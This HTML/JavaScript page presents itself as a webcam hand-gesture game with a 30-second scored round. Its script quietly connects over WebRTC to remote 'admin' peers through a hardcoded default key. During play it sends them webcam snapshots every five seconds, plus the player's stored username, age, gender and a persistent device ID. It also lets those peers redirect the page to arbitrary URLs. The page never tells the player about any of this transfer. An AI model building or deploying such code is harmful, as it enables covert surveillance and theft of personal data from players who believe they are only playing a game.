<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#08110e"><meta name="color-scheme" content="dark">
<title>Level 1: Gesture Points (30s Test)</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.5/peerjs.min.js"></script>
<style>
:root{--bg:#08110e;--card:#0d1a15;--line:#1f3328;--cu:#c9a24b;--am:#ffb627;--em:#34d399;--red:#f87171;--text:#eceae0;--mut:#a3b5aa}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font:16px/1.6 system-ui,-apple-system,"Segoe UI",sans-serif}
.w{max-width:680px;margin:0 auto;padding:28px 20px 56px}
a{color:var(--cu);text-decoration:none}a:focus-visible,button:focus-visible{outline:2px solid var(--am);outline-offset:3px}
h1{font:700 2rem/1.1 system-ui,sans-serif;margin:14px 0 8px}
p{color:var(--mut);margin:0 0 16px}
button{font:600 15px system-ui,sans-serif;padding:11px 20px;border-radius:6px;border:1px solid var(--cu);background:var(--cu);color:#08110e;cursor:pointer}
button.g{background:var(--card);color:var(--text);border-color:var(--line)}button:disabled{opacity:.5;cursor:wait}
#msg{min-height:1.6em;margin:14px 0;color:var(--am);white-space:pre-line}
#admin-banner{background:rgba(255,182,39,.12);border:1px solid var(--am);color:var(--text);padding:10px 14px;border-radius:8px;margin-bottom:14px;font-size:14px}
#admin-banner[hidden]{display:none !important}
.stage{position:relative;aspect-ratio:4/3;max-height:78vh;margin:0 auto;background:#000;border:1px solid var(--line);border-radius:10px;overflow:hidden}
.stage[hidden]{display:none !important}
.stage video,.stage canvas{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
.hud{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:space-between;padding:12px;pointer-events:none;text-shadow:0 1px 4px #000}
.top{display:flex;justify-content:space-between;gap:12px;align-items:flex-start}
#em{font-size:clamp(44px,12vw,72px);line-height:1}#lb{font-weight:600}
.r{text-align:right}#sc{font-size:2rem;font-weight:700;color:var(--am);line-height:1}
.mid{text-align:center;font-size:2rem;font-weight:700;color:var(--em);min-height:2.4rem}
.bars div{height:6px;background:rgba(255,255,255,.15);border-radius:3px;margin-top:6px;overflow:hidden}
.bars i{display:block;height:100%;width:0}#hb{background:var(--em)}#tb{background:var(--cu)}
.sm{font-size:13px}
</style></head>
<body><main class="w">
<a href="index.html">← User Hub</a> · <a href="poses.html">Level 2 (Poses)</a> · <a href="bonus.html">Level 3 (Bonus)</a>
<h1>Level 1: Hand Gestures (30s Test)</h1>
<p>Show the hand gesture on screen and hold it briefly to score. You get 30 seconds before escalating to Level 2 (Full-Body Poses).</p>

<div id="admin-banner" hidden></div>

<button id="go">Start Level 1 (30s)</button> <button id="stop" class="g" hidden>Stop</button>
<p id="msg" role="status"></p>
<div class="stage" id="stage-box" hidden>
<video id="v" autoplay playsinline webkit-playsinline muted></video><canvas id="c"></canvas>
<div class="hud" aria-live="polite">
<div class="top"><div><div id="em"></div><div id="lb"></div></div>
<div class="r"><div id="sc">0</div><div class="sm" id="st"></div><div class="sm" id="tl"></div></div></div>
<div class="mid" id="fl"></div>
<div class="bars"><div class="sm" id="seen"></div><div><i id="hb"></i></div><div><i id="tb"></i></div></div>
</div></div>
</main>
<script>
window.dbg = () => {};
const METERED_DOMAIN = 'testpagesandapps.metered.live';
const $ = s => document.querySelector(s);
const G = [
  ['Thumb_Up','👍','Thumbs up'],
  ['Victory','✌️','Peace sign'],
  ['Open_Palm','✋','Open palm'],
  ['Closed_Fist','✊','Fist'],
  ['Pointing_Up','☝️','Point up'],
  ['ILoveYou','🤟','I love you'],
  ['Thumb_Down','👎','Thumbs down']
];
const LIB = 'https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.14';
const MODEL = 'https://storage.googleapis.com/mediapipe-models/gesture_recognizer/gesture_recognizer/float16/1/gesture_recognizer.task';
const ROUND_MS = 30000; // 30-second test
const TARGET_MS = 6000;
const HOLD_MS = 600;

const v = $('#v'), c = $('#c'), cx = c.getContext('2d'), msg = t => $('#msg').textContent = t;
let mp, rec, du, stream, run = 0, score = 0, streak = 0, cur, t0 = 0, tEnd = 0, hold = 0, prev = 0, lastT = -1;
const mult = () => 1 + Math.min(streak, 4) * .5;

/* --- User Profile & Multi-Device Admin WebRTC Bridge --- */
const ADMIN_KEY = new URLSearchParams(location.search).get('key') || 'luna2026';
const MAX_SLOTS = 5;
const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
let devId = (isMobile ? 'MOBILE-' : 'LAPTOP-') + Math.random().toString(36).slice(2, 6).toUpperCase();
try { devId = localStorage.tl_dev_id || (localStorage.tl_dev_id = devId); } catch {}

function getUserProfile() {
  try {
    const p = JSON.parse(localStorage.tl_user_profile || 'null');
    if (p && p.username) {
      return { username: p.username, age: p.age, gender: p.gender, birthYear: p.birthYear };
    }
  } catch {}
  return null;
}

let peer = null, lastTelem = 0;
const slotConns = new Map();
const slotAttempts = new Map();
const snapCanvas = document.createElement('canvas');
snapCanvas.width = 160;
snapCanvas.height = 120;
const snapCtx = snapCanvas.getContext('2d');

async function getIceServers() {
  const fallback = [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun.metered.ca:80' },
    {
      urls: [
        'turn:openrelay.metered.ca:80',
        'turn:openrelay.metered.ca:443',
        'turn:openrelay.metered.ca:443?transport=tcp'
      ],
      username: 'openrelayproject',
      credential: 'openrelayproject'
    }
  ];
  const apiKey = (localStorage.tl_metered_key || '').trim();
  if (!apiKey) return fallback;
  try {
    const res = await fetch(`https://${METERED_DOMAIN}/api/v1/turn/credentials?apiKey=${encodeURIComponent(apiKey)}`);
    if (res.ok) {
      const turnServers = await res.json();
      if (Array.isArray(turnServers) && turnServers.length) return turnServers;
    }
  } catch {}
  return fallback;
}

async function initPeerBridge() {
  if (peer || typeof Peer === 'undefined') return;
  const iceServers = await getIceServers();
  peer = new Peer({ config: { iceServers } });
  peer.on('open', () => connectAllAdminSlots());
  peer.on('error', () => {});
}

function connectAllAdminSlots() {
  if (!peer || !peer.open) return;
  const now = Date.now();
  for (let s = 1; s <= MAX_SLOTS; s++) {
    const existing = slotConns.get(s);
    if (existing && existing.open && existing.authed) continue;
    if (existing && (now - (slotAttempts.get(s) || 0) < 8000)) continue;

    slotAttempts.set(s, now);
    const conn = peer.connect(`tl-cv-monitor-${ADMIN_KEY}-s${s}`, { reliable: true });
    conn.authed = false;
    slotConns.set(s, conn);

    conn.on('open', () => {
      conn.authed = true;
      sendTelemetry('EVENT', 'Entered Level 1 (Gestures)');
      if (run) sendSnapshot();
    });
    conn.on('data', data => handleAdminCommand(data));
    conn.on('close', () => slotConns.delete(s));
    conn.on('error', () => slotConns.delete(s));
  }
}

function handleAdminCommand(data) {
  if (!data || typeof data !== 'object') return;
  if (data.type === 'ADMIN_MSG' && data.text) {
    const b = $('#admin-banner');
    b.textContent = `📢 Admin Message: ${data.text}`;
    b.hidden = false;
  }
  if (data.type === 'ADMIN_ACCESS_CONTROL') {
    if (data.siteAllowed === false || data.lvl1 === false) {
      if (run) end(false);
      msg('Access to Level 1 was paused by Admin. Returning to Hub...');
      setTimeout(() => { location.href = 'index.html' + location.search; }, 1500);
    } else if (data.redirect) {
      location.href = data.redirect + location.search;
    }
  }
}

function broadcastToAdmins(payload) {
  slotConns.forEach(conn => {
    if (conn && conn.open && conn.authed) {
      try { conn.send(payload); } catch {}
    }
  });
}

function hasActiveAdmin() {
  for (const conn of slotConns.values()) {
    if (conn && conn.open && conn.authed) return true;
  }
  return false;
}

function sendTelemetry(type = 'TELEMETRY', eventMsg = '') {
  if (!hasActiveAdmin()) return;
  let best = score;
  try { best = Math.max(+localStorage.gp || 0, score); } catch {}
  const profile = getUserProfile();
  broadcastToAdmins({
    type,
    eventMsg,
    deviceId: devId,
    profile,
    game: 'gestures-lvl1',
    run: !!run,
    score,
    best,
    streak,
    mult: mult(),
    emoji: cur ? cur[1] : '⏳',
    target: cur ? cur[2] : 'None',
    timeLeft: run ? Math.max(0, Math.ceil((tEnd - performance.now()) / 1e3)) : 0,
    seen: $('#seen').textContent,
    readout: profile ? `${profile.username} (${profile.age}y, ${profile.gender})` : ''
  });
}

function sendSnapshot() {
  if (!run || !hasActiveAdmin() || !v.videoWidth) return;
  snapCtx.save();
  snapCtx.scale(-1, 1);
  snapCtx.drawImage(v, -160, 0, 160, 120);
  snapCtx.drawImage(c, -160, 0, 160, 120);
  snapCtx.restore();
  broadcastToAdmins({
    type: 'SNAPSHOT',
    deviceId: devId,
    profile: getUserProfile(),
    game: 'gestures-lvl1',
    image: snapCanvas.toDataURL('image/jpeg', 0.35)
  });
}

window.addEventListener('DOMContentLoaded', () => {
  initPeerBridge();
  setTimeout(connectAllAdminSlots, 1200);
});
window.addEventListener('beforeunload', () => { if (peer) peer.destroy(); });

setInterval(() => {
  if (!peer) initPeerBridge();
  else connectAllAdminSlots();
  if (run) sendSnapshot();
}, 5000);

/* --- Cross-Platform Camera Helper (Android / iOS / Desktop) --- */
async function requestCameraStream() {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
  const profiles = [
    { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
    { video: { facingMode: { ideal: 'user' } }, audio: false },
    { video: true, audio: false }
  ];
  let lastErr;
  for (const constraints of profiles) {
    try {
      return await navigator.mediaDevices.getUserMedia(constraints);
    } catch (err) {
      lastErr = err;
    }
  }
  throw lastErr;
}

function pick() {
  let g;
  do g = G[Math.random() * G.length | 0]; while (g === cur);
  cur = g;
  t0 = performance.now();
  hold = 0;
  $('#em').textContent = g[1];
  $('#lb').textContent = g[2];
}

function flash(t) {
  $('#fl').textContent = t;
  setTimeout(() => $('#fl').textContent = '', 800);
}

function hud(now) {
  $('#sc').textContent = score;
  $('#st').textContent = 'Streak ' + streak + ' · ×' + mult();
  $('#tl').textContent = Math.max(0, Math.ceil((tEnd - now) / 1e3)) + 's left';
  $('#hb').style.width = Math.min(hold / HOLD_MS * 100, 100) + '%';
  $('#tb').style.width = Math.max(0, 100 - (now - t0) / TARGET_MS * 100) + '%';
  if (now - lastTelem > 250) {
    lastTelem = now;
    sendTelemetry('TELEMETRY');
  }
}

function end(escalate = true) {
  run = 0;
  stream && stream.getTracks().forEach(t => t.stop());
  v.srcObject = null;
  cx.clearRect(0, 0, c.width, c.height);
  let b = 0;
  try {
    b = +localStorage.gp || 0;
    if (score > b) localStorage.gp = b = score;
  } catch {
    b = Math.max(b, score);
  }
  $('#go').hidden = false;
  $('#go').textContent = 'Play Level 1 Again';
  $('#stop').hidden = true;
  sendTelemetry('EVENT', 'Level 1 ended (Score: ' + score + ')');

  if (escalate) {
    msg('Level 1 complete! Score: ' + score + ' (Best: ' + b + '). Escalating to Level 2 (Full-Body Poses)...');
    setTimeout(() => {
      location.href = 'poses.html' + location.search;
    }, 2200);
  } else {
    msg('Stopped. Score: ' + score + ' (Best: ' + b + ').');
  }
}

function loop(now) {
  if (!run) return;
  requestAnimationFrame(loop);
  if (now >= tEnd) return end(true);
  if (v.currentTime === lastT || v.readyState < 2 || !v.videoWidth) return;
  lastT = v.currentTime;

  const dt = Math.max(0, now - prev);
  prev = now;
  const r = rec.recognizeForVideo(v, now);
  cx.clearRect(0, 0, c.width, c.height);
  r.landmarks.forEach(l => {
    du.drawConnectors(l, mp.GestureRecognizer.HAND_CONNECTIONS, { color: '#c9a24b', lineWidth: 3 });
    du.drawLandmarks(l, { color: '#ffb627', radius: 3 });
  });

  const g = r.gestures[0] && r.gestures[0][0];
  const s = g && G.find(x => x[0] === g.categoryName);
  $('#seen').textContent = r.landmarks.length ? (s ? 'Seeing: ' + s[1] + ' ' + s[2] : 'Hand detected') : 'No hand in view';

  hold = g && g.categoryName === cur[0] && g.score > .6 ? hold + dt : 0;
  if (hold >= HOLD_MS) {
    const hit = cur[2];
    const p = Math.round((100 + 100 * (1 - (now - t0) / TARGET_MS)) * mult());
    score += p;
    streak++;
    flash('+' + p);
    pick();
    sendTelemetry('EVENT', 'Hit ' + hit + ' (+' + p + ')');
  } else if (now - t0 > TARGET_MS) {
    const miss = cur[2];
    streak = 0;
    flash('Missed');
    pick();
    sendTelemetry('EVENT', 'Missed ' + miss);
  }
  hud(now);
}

$('#stop').onclick = () => end(false);

$('#go').onclick = async () => {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return msg('Camera access is not available. Use a current browser over HTTPS.');
  }
  $('#go').disabled = true;
  msg('Requesting camera…');
  try {
    stream = await requestCameraStream();
    v.muted = true;
    v.playsInline = true;
    v.srcObject = stream;
    await v.play();
    for (let i = 0; i < 20 && !v.videoWidth; i++) await new Promise(r => setTimeout(r, 50));
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    $('#stage-box').style.aspectRatio = `${c.width} / ${c.height}`;
    $('#stage-box').hidden = false;

    initPeerBridge();
    connectAllAdminSlots();

    if (!rec) {
      msg('Loading hand gesture model…');
      mp = await import(LIB + '/+esm');
      const f = await mp.FilesetResolver.forVisionTasks(LIB + '/wasm');
      const o = { baseOptions: { modelAssetPath: MODEL, delegate: 'GPU' }, runningMode: 'VIDEO', numHands: 1 };
      try {
        rec = await mp.GestureRecognizer.createFromOptions(f, o);
      } catch {
        o.baseOptions.delegate = 'CPU';
        rec = await mp.GestureRecognizer.createFromOptions(f, o);
      }
      du = new mp.DrawingUtils(cx);
    }

    score = 0;
    streak = 0;
    lastT = -1;
    prev = performance.now();
    tEnd = prev + ROUND_MS;
    run = 1;
    pick();
    hud(prev);
    msg('');
    $('#go').hidden = true;
    $('#stop').hidden = false;
    requestAnimationFrame(loop);
    sendTelemetry('EVENT', 'Started 30s Level 1 test');
    setTimeout(sendSnapshot, 800);
  } catch (e) {
    stream && stream.getTracks().forEach(t => t.stop());
    if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
      msg('Camera blocked by browser. Allow camera permission in your browser bar, then tap Start again.');
    } else if (e.name === 'NotFoundError') {
      msg('No camera found on this device.');
    } else {
      msg('Could not start camera: ' + e.message);
    }
  }
  $('#go').disabled = false;
};
</script>
</body></html>
